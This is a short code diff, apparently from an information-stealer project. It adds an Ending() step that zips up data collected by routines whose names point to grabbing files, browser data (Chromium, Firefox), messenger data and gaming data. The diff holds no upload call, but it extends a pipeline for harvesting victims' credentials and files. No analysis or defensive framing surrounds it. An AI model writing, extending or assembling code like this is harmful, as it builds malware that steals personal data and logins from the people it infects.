@@ -30,7 +30,6 @@
 #include "scripts/scripts.h"
 #include "targets/targets.h"
 
-
 /// <summary>
 /// call secure functions
 /// </summary>
@@ -43,6 +42,8 @@ void Gaming();
 void Messengers();
 
 void Other();
+
+void Ending();
 
 /// <summary>
 /// Main function in the program. 
@@ -71,6 +72,7 @@ void Functions()
 
 	Other();
 
+	Ending();
 }
 
 void SystemInfo() 
@@ -118,4 +120,9 @@ void Other()
 		files::File_Grabber();
 	browsers::Chromium();
 	browsers::FireFox();
+}
+
+void Ending() 
+{
+	manager::MakeZip();
 }
